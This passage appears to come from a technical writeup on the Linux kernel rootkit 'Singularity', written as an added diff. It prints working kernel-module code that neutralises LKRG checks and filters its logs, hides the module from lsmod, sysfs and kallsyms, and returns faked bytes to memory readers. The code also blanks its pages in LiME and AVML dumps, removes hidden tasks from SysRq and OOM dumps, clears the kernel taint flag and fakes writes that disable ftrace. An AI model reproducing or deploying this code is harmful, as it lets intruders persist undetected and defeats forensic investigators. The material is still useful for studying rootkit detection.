+            return NULL;
+    }
+
+Once a control structure is found, lkrg_relax_controls() saves its original
+values on the first change, resolves set_memory_rw()/set_memory_ro(), and
+zeros the selected PINT, PCFI and UMH validate/enforce fields; the code
+still depends on private LKRG layout and heuristics, so version sensitivity
+remains even without the old fixed-offset write.
+
+    if (!lkrg_ctrl_make_rw(ctrl))
+        return false;
+
+    WRITE_ONCE(ctrl->p_pint_validate, 0);
+    WRITE_ONCE(ctrl->p_pint_enforce, 0);
+    WRITE_ONCE(ctrl->p_pcfi_validate, 0);
+    WRITE_ONCE(ctrl->p_pcfi_enforce, 0);
+    WRITE_ONCE(ctrl->p_umh_validate, 0);
+    WRITE_ONCE(ctrl->p_umh_enforce, 0);
+    lkrg_ctrl_make_ro(ctrl);
+
+
+hook_vprintk_emit() filters the messages produced by LKRG.
+
+The filter looks for LKRG-flavored log traffic, expands the formatted
+message into lkrg_log_buf, and suppresses output when:
+
+  - the log references UMH blocking while the bypass window is active
+  - the message contains a hidden PID or child PID
+
+
+From modules/lkrg_bypass.c:
+
+static notrace bool should_filter_log(const char *msg)
+{
+    pid_t pid;
+    int i;
+
+    if (!msg || !strstr(msg, "LKRG")) return false;
+
+    if (atomic_read(&umh_bypass_active) > 0) {
+        if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
+            strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
+            return true;
+    }
+
+    pid = extract_pid_from_log(msg);
+    if (pid > 0) {
+        for (i = 0; i < hidden_count && i < MAX_HIDDEN_PIDS; i++)
+            if (hidden_pids[i] == pid) return true;
+        for (i = 0; i < child_count && i < MAX_CHILD_PIDS; i++)
+            if (child_pids[i] == pid) return true;
+    }
+
+    return false;
+}
+
+static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
+    const struct dev_printk_info *dev_info, const char *fmt, va_list args)
+{
+    /* abridged: formatting, buffer allocation, and cleanup omitted */
+    ...
+    filter = should_filter_log(lkrg_log_buf);
+    ...
+    if (filter) return len;
+    return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+}
+
+The hook returns len for a suppressed message.
+
+send_sig_info() is also hooked. While the UMH bypass flag is active,
+a SIGKILL aimed at a PID/TGID already present in hidden_pids[] or
+child_pids[] is reported as handled without calling the original path:
+
+static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
+    struct task_struct *p)
+{
+    if (sig == SIGKILL && p && atomic_read(&umh_bypass_active) > 0) {
+        if (is_hidden_pid(p->tgid) || is_child_pid(p->tgid) ||
+            is_hidden_pid(p->pid)  || is_child_pid(p->pid))
+            return 0;
+    }
+    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
+}
+
+The hook set also includes these exploit-detection functions:
+
+  - p_ed_enforce_validation()
+  - p_ed_enforce_validation_paranoid()
+  - p_ed_validate_current()
+  - p_ed_validate_off_flag_wrap()
+  - p_ed_enforce_pcfi()
+
+Three of those hooks, p_ed_enforce_validation(), p_ed_validate_current()
+and p_ed_validate_off_flag_wrap(), go through should_skip_lkrg_ed(),
+which first calls lkrg_relax_controls() and then suppresses LKRG handling
+when either the UMH bypass is active or the current lineage is hidden.
+
+The other two use their own conditions. p_ed_enforce_validation_paranoid()
+returns 0 while the UMH bypass is active or either hidden PID table is
+non-empty. p_ed_enforce_pcfi() returns 0 when the bypass is active or the
+target/current task belongs to a hidden lineage.
+
+From modules/lkrg_bypass.c:
+
+static notrace bool should_skip_lkrg_ed(void)
+{
+    lkrg_relax_controls();
+
+    if (atomic_read(&umh_bypass_active) > 0)
+        return true;
+
+    return should_hide_task(current);
+}
+
+static notrace void hook_p_ed_enforce_validation(void)
+{
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_enforce_validation)
+        orig_p_ed_enforce_validation();
+}
+
+static notrace int hook_p_ed_enforce_pcfi(struct task_struct *task, void
+*orig,
+    struct pt_regs *regs)
+{
+    if (atomic_read(&umh_bypass_active) > 0 ||
+        should_hide_task(task ? task : current))
+        return 0;
+
+    return orig_p_ed_enforce_pcfi ?
+        orig_p_ed_enforce_pcfi(task, orig, regs) : 0;
+}
+
+The call_usermodehelper_exec_async() and call_usermodehelper_exec() hooks
+are more limited. When the UMH bypass flag is active, the module:
+
+  - re-runs lkrg_relax_controls() before entering the helper path
+  - hides the current helper-related task
+  - runs the original UMH path
+  - leaves restoration to module teardown instead of per-call rollback
+
+This does not just turn LKRG off; control relaxation is re-applied as 
+needed, and the saved values are restored duringlkrg_bypass_exit().
+
+The path is:
+
+static notrace int hook_call_usermodehelper_exec_async(void *data)
+{
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
+
+    if (bypass_active) {
+        add_hidden_pid(current->pid);
+        add_child_pid(current->pid);
+    }
+
+    return orig_call_usermodehelper_exec_async ?
+        orig_call_usermodehelper_exec_async(data) : 0;
+}
+
+static notrace int hook_call_usermodehelper_exec(struct subprocess_info
+*sub_info, int wait)
+{
+    int ret;
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
+
+    if (bypass_active) {
+        add_hidden_pid(current->pid);
+    }
+
+    ret = orig_call_usermodehelper_exec ?
+        orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
+
+    return ret;
+}
+
+main.c calls lkrg_bypass_init() before selfdefense_init(); if lkrg.ko
+appears later, the notifier schedules delayed setup and both module load
+orders are covered.
+
+What this still does not cover:
+
+  - it does not show direct inline tampering with LKRG's core integrity
+    comparison routines
+  - it still relies on version-sensitive LKRG internal layout assumptions
+  - it only hooks selected LKRG validation/enforcement paths, not all of
+    them
+  - it can blind or weaken enforcement without guaranteeing universal
+    immunity against every LKRG build or policy
+
+
+  --[ Leaving the module list
+
+A loaded module sits in four places: the kernel module list,
+/sys/module/<name>/, /proc/modules, and kallsyms. Traditional hiding
+unlinks from one:
+
+    list_del(&THIS_MODULE->list);
+
+That leaves three other paths. module_hide_current() covers all four.
+
+From modules/hide_module.c:
+
+static struct module_hider_state hider_state = {0};
+static void module_hide_deferred_work(struct work_struct *work);
+static DECLARE_DELAYED_WORK(hide_work, module_hide_deferred_work);
+
+static void module_hide_deferred_work(struct work_struct *work)
+{
+    module_hide_current();
+}
+
+static void __remove_from_sysfs(struct module *mod)
+{
+    struct kobject *kobj = &mod->mkobj.kobj;
+
+    if (kobj && kobj->parent) {
+        kobject_del(kobj);
+        kobj->parent = NULL;
+        kobj->kset   = NULL;
+
+        if (mod->holders_dir) {
+            kobject_put(mod->holders_dir);
+            mod->holders_dir = NULL;
+        }
+    }
+}
+
+static void __remove_from_module_list(struct module *mod)
+{
+    if (!list_empty(&mod->list)) {
+        list_del_init(&mod->list);
+
+        mod->list.prev = (struct list_head *)0x37373731;
+        mod->list.next = (struct list_head *)0x22373717;
+    }
+}
+
+static void __sanitize_module_info(struct module *mod)
+{
+    mod->sect_attrs = NULL;
+    memset(mod->name, 0, sizeof(mod->name));
+}
+
+static void __remove_symbols_from_kallsyms(struct module *mod)
+{
+    if (mod->kallsyms) {
+        mod->kallsyms->num_symtab = 0;
+        mod->kallsyms->symtab     = NULL;
+        mod->kallsyms->strtab     = NULL;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+        mod->kallsyms->typetab    = NULL;
+#endif
+    }
+}
+
+notrace void module_hide_current(void)
+{
+    struct module *mod = THIS_MODULE;
+
+    if (hider_state.hidden)
+        return;
+
+    hider_state.saved_list_pos = mod->list.prev;
+    hider_state.saved_parent   = mod->mkobj.kobj.parent;
+
+    __remove_from_sysfs(mod);
+    __remove_from_module_list(mod);
+    __sanitize_module_info(mod);
+    __remove_symbols_from_kallsyms(mod);
+
+    hider_state.hidden = true;
+}
+
+notrace void module_hide_current_deferred(void)
+{
+    if (!hider_state.hidden)
+        schedule_delayed_work(&hide_work,
+            msecs_to_jiffies(MODULE_HIDE_DELAY_MS));
+}
+
+notrace void module_hide_cancel_deferred(void)
+{
+    cancel_delayed_work_sync(&hide_work);
+}
+
+The list pointers are poisoned with 0x37373731/0x22373717 after unlinking
+a memory walk of the struct then gets garbage instead of useful data.
+
+sect_attrs is cleared, so section queries through sysfs or a debugger find
+nothing. The name field is zeroed, so scans of struct module in memory do
+not find an identifying string. The kallsyms block has num_symtab zeroed and
+all table pointers nulled, so kallsyms iteration skips the module.
+
+main.c calls module_hide_current_deferred() at the end of init; the hide
+happens 5000 ms later, so the LKRG notifier setup runs 1 second after
+lkrg.ko goes live. Both can run during that window, but it is not a
+guarantee. The LKRG notifier stays registered after the hide, so later LKRG
+loads do not depend on the hide.
+
+After the hide: lsmod shows nothing, /sys/module/singularity is gone, and
+kallsyms finds no symbols through the normal path. The poisoned pointers are
+anti-forensic, but they are also fragile state corruption and do not
+guarantee that every memory acquisition tool will miss the module.
+
+
+  --[ Lying to memory readers
+
+Self-defense also targets live inspection after an analyst obtains kernel
+execution or memory-acquisition tooling.
+
+From modules/selfdefense.c, the first step is symbol prologue snapshotting:
+
+    #define PROLOGUE_SNAP  16
+    #define MAX_SNAPS      512
+
+    struct sd_snap {
+        unsigned long addr;
+        u8            bytes[PROLOGUE_SNAP];
+    };
+
+Early in module startup, after sd_bootstrap_kprobe_hook() and
+lkrg_bypass_init(), main.c calls sd_snapshot_all() to record the original
+first bytes of high-value symbols. That snapshot is later used as a lie
+layer when someone reads code bytes back out of kernel memory.
+
+
+One of the first self-defense steps hooks register_kprobe() directly:
+
+    ret = sd_bootstrap_kprobe_hook();
+
+Temporary kprobes are a common way to recover symbol addresses or instrument
+a live kernel. Singularity wants to get in front of that path before anyone
+else uses it for inspection.
+
+From modules/selfdefense.c:
+
+static notrace int hook_register_kprobe(struct kprobe *p)
+{
+    int ret;
+    const char *saved;
+
+    if (!p)
+        return orig_register_kprobe(p);
+
+    if (within_module((unsigned long)__builtin_return_address(0),
+        THIS_MODULE)) {
+        saved          = p->symbol_name;
+        p->symbol_name = NULL;
+        ret = orig_register_kprobe(p);
+        p->symbol_name = saved;
+        return ret;
+    }
+
+    return orig_register_kprobe(p);
+}
+
+static void notrace kprobe_ftrace_thunk(unsigned long ip,
+                                        unsigned long parent_ip,
+                                        struct ftrace_ops *ops,
+                                        struct ftrace_regs *fregs)
+{
+    if (!within_module(parent_ip, THIS_MODULE))
+        ftrace_regs_set_instruction_pointer(fregs,
+            (unsigned long)hook_register_kprobe);
+}
+
+This does not disable kprobes system-wide; external callers still reach the
+original register_kprobe(). The special case is a call returning into this
+module, which protects the bootstrap/resolution path without affecting the
+whole kprobe subsystem.
+
+Memory forensics and low-level inspection code often read kernel text using
+fault-safe copy helpers. The self-defense layer hooks that too:
+
+    static notrace long hook_copy_from_kernel_nofault(void *dst,
+                                                      const void *src,
+                                                      size_t size)
+
+If the requested address belongs to a protected symbol or to the module
+itself, the hook returns snapshotted bytes or a sanitized NOP-filled buffer
+instead of the live hooked instructions.
+
+A memory reader can therefore receive the saved bytes instead of the
+modified prologue it expected to catch.
+
+The core logic is:
+
+static notrace long hook_copy_from_kernel_nofault(void *dst, const void
+*src,
+                                                   size_t size)
+{
+    unsigned long addr = (unsigned long)src;
+    const u8 *snap;
+
+    if (within_module(addr, THIS_MODULE)) {
+        snap = sd_find_snap(addr, size);
+        if (snap && dst) { memcpy(dst, snap, size); return 0; }
+        if (dst) memset(dst, 0x90, size);
+        return 0;
+    }
+
+    snap = sd_find_snap(addr, size);
+    if (snap && dst) {
+        memcpy(dst, snap, size);
+        return 0;
+    }
+
+    return orig_copy_from_kernel_nofault(dst, src, size);
+}
+
+Two cases:
+
+  - if the address falls inside the module, the reader can get either a
+    saved snapshot or a NOP-filled buffer
+  - if the address belongs to a protected external symbol, the reader gets
+    the pre-hook bytes instead of the live modified prologue
+
+The same module also filters several kernel discovery helpers:
+
+  - kallsyms_on_each_symbol()
+  - __module_address()
+  - find_module()
+
+These hooks attack three different analyst workflows:
+
+  - enumerate every symbol and look for suspicious addresses
+  - resolve an address back to its owning module
+  - ask the kernel directly whether a named module exists
+
+If the queried symbol or address belongs to Singularity, the answer becomes
+"nothing here."
+
+
+  --[ RAM walks
+
+The self-defense layer does not stop at symbol space. It also interferes
+with physical memory walking:
+
+  - walk_system_ram_res()
+  - walk_iomem_res_desc()
+
+The module's MOD_TEXT physical range is computed first.
+walk_system_ram_res() calls get the range split in two, leaving a hole where
+the text pages were. walk_iomem_res_desc() calls that overlap the range are
+dropped entirely.
+
+There is also an iomem poisoning step that relabels the module's backing RAM
+range away from ordinary System RAM, raising the cost of automated memory
+collection logic that trusts the resource tree.
+
+The split for walk_system_ram_res is implemented very literally:
+
+static notrace int sd_walk_filter(u64 start, u64 end, void *arg)
+{
+    struct sd_walk_ctx *ctx   = arg;
+    unsigned long mod_start = 0, mod_end = 0;
+
+    sd_module_phys_range(&mod_start, &mod_end);
+
+    if (!mod_end || end < mod_start || start > mod_end)
+        return ctx->real_cb(start, end, ctx->real_arg);
+
+    if (start < mod_start)
+        ctx->real_cb(start, (u64)mod_start - 1, ctx->real_arg);
+
+    if (end > mod_end)
+        ctx->real_cb((u64)mod_end + 1, end, ctx->real_arg);
+
+    return 0;
+}
+
+If a collector asks for one contiguous RAM span covering the text pages, it
+gets two subranges instead with the hole cut out of the middle.
+
+  --[ LiME and AVML
+
+LiME maps each physical page with kmap_local_page() and copies it with
+copy_mc_to_kernel(). On modern kernels, the header defines:
+
+    #define copy_mc_to_kernel copy_mc_to_kernel
+
+That macro makes the #ifdef match, so LiME uses copy_mc_to_kernel() instead
+of copy_page(). copy_mc_to_kernel shows up as a T symbol in kallsyms but is
+not in available_filter_functions, so ftrace cannot hook it. A kprobe is
+used instead.
+
+On x86_64 >= 5.11, kmap_local_page() returns the direct-mapped VA of the
+physical page (0xffff888...), which lands in regs->si. virt_to_phys() on
+that gives the physical address. If it is one of ours, regs->si gets
+swapped for a zeroed static buffer and the handler returns 0. LiME copies
+zeros out:
+
+static int notrace sd_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
+{
+    void *src = (void *)regs->si;
+    unsigned long phys = 0;
+    int i, found_partial = 0;
+
+    if (!sd_mod_phys_count && !sd_partial_count)
+        return 0;
+
+    if (virt_addr_valid(src)) {
+        phys = virt_to_phys(src) & PAGE_MASK;
+    } else {
+        struct page *pg = vmalloc_to_page(src);
+        if (pg)
+            phys = page_to_phys(pg) & PAGE_MASK;
+    }
+
+    if (!phys)
+        return 0;
+
+    if (sd_is_mod_page(phys)) {
+        regs->si = (unsigned long)sd_zero_page;
+        return 0;
+    }
+
+    for (i = 0; i < sd_partial_count; i++) {
+        if (sd_partial[i].phys != phys)
+            continue;
+        if (!found_partial) {
+            memcpy(sd_scratch_page, src, PAGE_SIZE);
+            found_partial = 1;
+        }
+        memset(sd_scratch_page + sd_partial[i].off, 0, sd_partial[i].len);
+    }
+    if (found_partial)
+        regs->si = (unsigned long)sd_scratch_page;
+
+    return 0;
+}
+
+On kernel >= 6.4, struct module lives in MOD_DATA or MOD_RODATA. Volatility
+reads name, size, and flags from it to identify the module.
+sd_init_mod_pages() walks all MOD_MEM_NUM_TYPES sections at load time so
+every backing physical page ends up in the zeroing list.
+
+task_structs share slab pages with other objects. sd_register_hidden_task()
+records the exact byte range of the task_struct within each physical page.
+The pre_handler copies the real page to sd_scratch_page, zeroes those bytes,
+and redirects src to the scratch, so everything else on the page is
+untouched.
+
+AVML falls through to /proc/kcore when /dev/crash is absent and /dev/mem is
+locked. clear_taint_dmesg.c hooks the read on "kcore" and runs
+filter_buffer_content(), a newline-based filter. Binary ELF data has no
+newlines so it returns 0; AVML dies at ELF parse with "failed to fill whole
+buffer".
+
+  --[ SysRq and task dumps
+
+modules/sysrq_hook.c handles scheduler diagnostics and task dumps.
+
+Three important paths are filtered:
+
+  - sched_show_task() for SysRq-T style task dumps
+  - dump_header() for OOM-style task listings
+  - print_task.isra.0 / print_task() for scheduler debug output
+
+Parent lineage is walked up to 4096 levels, so a descendant hidden only
+through its ancestor is still suppressed from those dumps.
+
+
+From modules/sysrq_hook.c, the first key primitive is lineage-aware
+hiding:
+
+static notrace bool is_task_hidden_fast(struct task_struct *p)
+{
+    struct task_struct *parent;
+    int guard = 0;
+
+    if (unlikely(!p))
+        return false;
+
+    if (is_hidden_pid(p->pid) || is_child_pid(p->pid))
+        return true;
+
+    if (is_hidden_pid(p->tgid) || is_child_pid(p->tgid))
+        return true;
+
+    rcu_read_lock();
+    parent = rcu_dereference(p->real_parent);
+    while (parent) {
+        if (unlikely(++guard > 4096))
+            break;
+
+        if (parent == p || parent->pid <= 1)
+            break;
+
+        if (is_hidden_pid(parent->pid) || is_child_pid(parent->pid) ||
+            is_hidden_pid(parent->tgid) || is_child_pid(parent->tgid)) {
+            rcu_read_unlock();
+            return true;
+        }
+
+        parent = rcu_dereference(parent->real_parent);
+    }
+    rcu_read_unlock();
+
+    return false;
+}
+
+The lineage walk catches a task that is not itself in hidden_pids[] when one
+of its ancestors is tracked.
+
+The direct dump hooks:
+
+static notrace void hook_sched_show_task(struct task_struct *p)
+{
+    if (unlikely(!orig_sched_show_task || !p))
+        return;
+
+    if (likely(hidden_pid_count() == 0 && child_pid_count() == 0)) {
+        orig_sched_show_task(p);
+        return;
+    }
+
+    if (is_task_hidden_fast(p))
+        return;
+
+    orig_sched_show_task(p);
+}
+
+static notrace void hook_print_task_isra(void *m, void *rq, struct
+task_struct *p)
+{
+    if (unlikely(!orig_print_task_isra || !p))
+        return;
+
+    if (likely(hidden_pid_count() == 0 && child_pid_count() == 0)) {
+        orig_print_task_isra(m, rq, p);
+        return;
+    }
+
+    if (is_task_hidden_fast(p))
+        return;
+
+    orig_print_task_isra(m, rq, p);
+}
+
+
+hook_dump_header() instead uses dump_tasks_filtered() to rebuild the
+list from for_each_process(), excluding:
+
+  - directly hidden PIDs
+  - tracked child PIDs
+  - descendants discovered through parent-lineage walking
+  - kernel threads without an mm
+
+The replacement path, in short:
+
+static notrace void dump_tasks_filtered(void)
+{
+    struct task_struct *p;
+    struct task_struct *task;
+
+    pr_info("Tasks state (memory values in pages):\n");
+    pr_info("[ pid ]   uid  tgid total_vm      rss pgtables_bytes swapents
+        oom_score_adj name\n");
+
+    rcu_read_lock();
+    for_each_process(p) {
+        ...
+        if (is_task_hidden_fast(p))
+            continue;
+
+        if (p->flags & PF_KTHREAD)
+            continue;
+
+        ...
+
+        pr_info("[%5d] %5d %5d %8lu %8lu %13lu %8lu %5hd %s\n",
+                task->pid,
+                from_kuid(&init_user_ns, task_uid(task)),
+                task->tgid,
+                total_vm,
+                rss,
+                pgtables,
+                swapents,
+                oom_score_adj,
+                task->comm);
+    }
+    rcu_read_unlock();
+}
+
+static notrace void hook_dump_header(void *oc, struct task_struct *p)
+{
+    if (unlikely(!orig_dump_header))
+        return;
+
+    if (likely(hidden_pid_count() == 0 && child_pid_count() == 0)) {
+        orig_dump_header(oc, p);
+        return;
+    }
+
+    dump_tasks_filtered();
+}
+
+
+SysRq is often a fallback when /proc looks wrong, but here it is also fed by
+the same compromised kernel. Alt+SysRq+T, /proc/sysrq-trigger, and scheduler
+debug output are therefore not independent sources of information.
+
+
+  --[ Taint
+
+Kernel SysRq output is not the only forensic residue; an unsigned module
+normally taints the kernel, and that taint is visible in places like
+/proc/sys/kernel/tainted, dmesg summaries, and panic diagnostics.
+
+modules/reset_tainted.c clears that residue once:
+
+#define RESET_THREAD_NAME "zer0t"
+
+static struct task_struct *cleaner_thread = NULL;
+static unsigned long *taint_mask_ptr = NULL;
+
+static notrace void reset_taint_mask(void) {
+    if (taint_mask_ptr && *taint_mask_ptr != 0)
+        *taint_mask_ptr = 0;
+}
+
+static notrace int zt_thread(void *data) {
+    reset_taint_mask();
+    return 0;
+}
+
+notrace int reset_tainted_init(void) {
+    taint_mask_ptr = resolve_sym("tainted_mask");
+    if (!taint_mask_ptr)
+        return -EFAULT;
+
+    cleaner_thread = kthread_run(zt_thread, NULL, RESET_THREAD_NAME);
+    if (IS_ERR(cleaner_thread))
+        return PTR_ERR(cleaner_thread);
+
+    add_hidden_pid(cleaner_thread->pid);
+
+    return 0;
+}
+
+notrace void reset_tainted_exit(void) {
+    if (cleaner_thread)
+        kthread_stop(cleaner_thread);
+}
+
+zt_thread() clears the taint once and exits; the helper is named zer0t and
+is added to hidden_pids[] immediately, with no persistent scrubber loop.
+
+The intended visible result:
+
+    $ cat /proc/sys/kernel/tainted
+    0
+
+    $ dmesg | grep -i taint
+    (nothing)
+
+  --[ Keeping ftrace alive
+
+An analyst trying to disable ftrace to stop the hooks:
+
+    $ echo 0 > /proc/sys/kernel/ftrace_enabled
+
+The write must appear to succeed while ftrace remains enabled; the write
+path is intercepted and the read path returns the fake value.
+
+
+From modules/hooks_write.c:
+
+char saved_ftrace_value[64] = "1\n";
+EXPORT_SYMBOL(saved_ftrace_value);
+
+bool ftrace_write_intercepted = false;
+EXPORT_SYMBOL(ftrace_write_intercepted);
+
+The main write() hook detects ftrace files and delegates to a specialized
+handler. Abridged:
+
+static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
+{
+    int fd;
+    char __user *user_buf;
+    size_t count;
+    struct file *file;
+
+    fd = (int)regs->di;
+    user_buf = (char __user *)regs->si;
+    count = (size_t)regs->dx;
+
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_write, false);
+        }
+    }
+
+    /* remaining write filters omitted */
+}
+
+
+When a write to ftrace_enabled or tracing_on is detected, this function
+handles it. It parses the written value but never actually writes to the
+real file:
+
+static notrace asmlinkage ssize_t hooked_write_ftrace(
+    const struct pt_regs *regs,
+    asmlinkage ssize_t (*orig)(const struct pt_regs *),
+    bool compat32)
+{
+    int fd;
+    const char __user *user_buf;
+    size_t count;
+    struct file *file;
+    char *kernel_buf = NULL;
+    size_t len, i, start, end;
+    long parsed_value;
+    int ret;
+    ssize_t result = -EINVAL;
+    loff_t pos;
+
+    if (!compat32) {
+        fd       = regs->di;
+        user_buf = (const char __user *)regs->si;
+        count    = regs->dx;
+    } else {
+        fd       = regs->bx;
+        user_buf = (const char __user *)regs->cx;
+        count    = regs->dx;
+    }
+
+    file = fget(fd);
+    if (!file)
+        return orig(regs);
+
+    pos = file->f_pos;
+
+    if (pos == 0)
+        ftrace_write_intercepted = false;
+
+    if (count == 0) {
+        fput(file);
+        return -EINVAL;
+    }
+
+    kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
+    if (!kernel_buf) {
+        fput(file);
+        return -ENOMEM;
+    }
+
+    if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE)))
+        {
+        result = -EFAULT;
+        goto out;
+    }
+
+    len = min(count, (size_t)BUF_SIZE - 1);
+    kernel_buf[len] = '\0';
+
+    for (i = 0; i < len; i++) {
+        char c = kernel_buf[i];
+        if ((c >= '0' && c <= '9') ||
+            (c >= 'a' && c <= 'f') ||
+            (c >= 'A' && c <= 'F') ||
+            c == 'x' || c == 'X' || c == '-' ||
+            c == ' ' || c == '\t' || c == '\n' ||
+            c == '\r' || c == '\f' || c == '\v' || c == '\0')
+            continue;
+        result = -EINVAL;
+        goto out;
+    }
+
+    start = 0;
+    while (start < len && (kernel_buf[start] == '\0' ||
+                           kernel_buf[start] == ' ' ||
+                           kernel_buf[start] == '\t' ||
+                           kernel_buf[start] == '\f' ||
+                           kernel_buf[start] == '\v'))
+        start++;
+
+    if (start >= len) {
+        file->f_pos += count;
+        result = count;
+        goto out;
+    }
+
+    if (pos != 0) {
+        if (!ftrace_write_intercepted) {
+            result = -EINVAL;
+            goto out;
+        } else {
+            file->f_pos += count;
+            result = count;
+            goto out;
+        }
+    }
+
+    end = start;
+    while (end < len && kernel_buf[end] != '\n' &&
+           kernel_buf[end] != '\0' && kernel_buf[end] != ' ' &&
+           kernel_buf[end] != '\r' && kernel_buf[end] != '\t')
+        end++;
+
+    if (end == start || kernel_buf[start] == '+' || (end - start) > 20) {
+        result = -EINVAL;
+        goto out;
+    }
+
+    kernel_buf[end] = '\0';
+
+    ret = kstrtol(kernel_buf + start, 0, &parsed_value);
+    if (ret != 0 || parsed_value > INT_MAX || parsed_value < INT_MIN) {
+        result = -EINVAL;
+        goto out;
+    }
+
+    i = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value),
+                 "%ld\n", parsed_value);
+    if (i >= sizeof(saved_ftrace_value))
+        saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';
+
+    ftrace_write_intercepted = true;
+    file->f_pos += count;
+    result = count;
+
+out:
+    kfree(kernel_buf);
+    fput(file);
+    return result;
+}
+
+The function saves the value in saved_ftrace_value for later reads, sets
+ftrace_write_intercepted to true, and returns count (success) without
+actually modifying ftrace.
+
+When ftrace_enabled is read:
+
+extern char saved_ftrace_value[64];
+extern bool ftrace_write_intercepted;
+
+static notrace bool is_ftrace_fake_disabled(void)
+{
+    if (ftrace_write_intercepted && saved_ftrace_value[0] == '0')
+        return true;
+    return false;
+}
+
+When the read hook detects that ftrace_enabled is being read after an
+intercepted write, it returns the saved fake value instead of the real one:
+
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            if (is_real_ftrace_enabled(check_file)) {
+                size_t fake_len = strlen(saved_ftrace_value);
+                unsigned long flags, now = jiffies;
+                bool should_return_data = false;
+
+                spin_lock_irqsave(&ftrace_read_lock, flags);
+                if (time_after(now, last_ftrace_read_jiffies +
+                    msecs_to_jiffies(100))) {
+                    should_return_data = true;
+                    last_ftrace_read_jiffies = now;
+                }
+                spin_unlock_irqrestore(&ftrace_read_lock, flags);
+
+                fput(check_file);
+
+                if (!should_return_data)
+                    return 0;
+
+                if (fake_len <= count) {
+                    if (!copy_to_user(user_buf, saved_ftrace_value,
+                        fake_len))
+                        return fake_len;
+                }
+                return -EFAULT;
+            }
+            fput(check_file);
+        }
+    }
+
+
+The same logic exists for 32-bit syscalls. The only difference is the
+register layout - 32-bit uses bx/cx/dx instead of di/si/dx. Relevant path:
+
+static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
+{
+    int fd;
+    char __user *user_buf;
+    size_t count;
+    struct file *file;
+
+    fd = (int)regs->bx;
+    user_buf = (char __user *)regs->cx;
+    count = (size_t)regs->dx;
+
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_write32, true);
+        }
+    }
+
+    /* remaining filters omitted */
+}
+
+That gives the implemented write hook family IA32 coverage for the paths
+listed below.
+
+The write protection extends across the write-style paths listed below to
+reduce bypass via common alternative methods:
+
+From modules/hooks_write.c:
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_write",   hooked_write,   &original_write),
+    HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
+
+    HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
+    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),
+
+    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64),
+    HOOK("__x64_sys_ia32_pwrite64",
+         hooked_pwrite64_ia32,
+         &original_pwrite64_ia32),
+
+    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev),
+    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
+    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
+    HOOK("__ia32_sys_pwritev2",
+         hooked_pwritev2_ia32,
+         &original_pwritev2_ia32),
+
+    HOOK("__x64_sys_sendfile", hooked_sendfile, &original_sendfile),
+    HOOK("__x64_sys_sendfile64", hooked_sendfile64, &original_sendfile64),
+    HOOK("__ia32_sys_sendfile",
+         hooked_sendfile_ia32,
+         &original_sendfile_ia32),
+    HOOK("__ia32_sys_sendfile64",
+         hooked_sendfile64_ia32,
+         &original_sendfile64_ia32),
+    HOOK("__ia32_compat_sys_sendfile",
+         hooked_compat_sendfile,
+         &original_compat_sendfile),
+    HOOK("__ia32_compat_sys_sendfile64",
+         hooked_compat_sendfile64,
+         &original_compat_sendfile64),
+
+    HOOK("__x64_sys_copy_file_range",
+         hooked_copy_file_range,
+         &original_copy_file_range),
+    HOOK("__ia32_sys_copy_file_range",
+         hooked_copy_file_range_ia32,
+         &original_copy_file_range_ia32),
+
+    HOOK("__x64_sys_splice", hooked_splice, &original_splice),
+    HOOK("__ia32_sys_splice", hooked_splice_ia32, &original_splice_ia32),
+
+    HOOK("__x64_sys_vmsplice", hooked_vmsplice, &original_vmsplice),
+    HOOK("__ia32_sys_vmsplice",
+         hooked_vmsplice_ia32,
+         &original_vmsplice_ia32),
+
+    HOOK("__x64_sys_tee", hooked_tee, &original_tee),
+    HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32),
+
+    HOOK("__x64_sys_io_uring_enter",
+         hooked_io_uring_enter,
+         &original_io_uring_enter),
+    HOOK("__ia32_sys_io_uring_enter",
+         hooked_io_uring_enter,
+         &original_io_uring_enter2),
+};
+
+That's 26 write-related hooks covering basic write, vectored writes,
+positional writes, zero-copy transfers like sendfile, pipe-based transfers
+like splice/vmsplice/tee, and io_uring to prevent async bypass for protected
+descriptors. The common paths used to reach ftrace/tracing controls are
+covered:
+
+    $ echo 0 > /proc/sys/kernel/ftrace_enabled           # write()
+    $ dd if=/dev/zero of=/proc/sys/kernel/ftrace_enabled # write()
+    $ cat file | tee /proc/sys/kernel/ftrace_enabled     # splice/tee
+    $ sendfile to ftrace_enabled                         # sendfile()
+
+Those targeted paths are intercepted and return fake success while ftrace
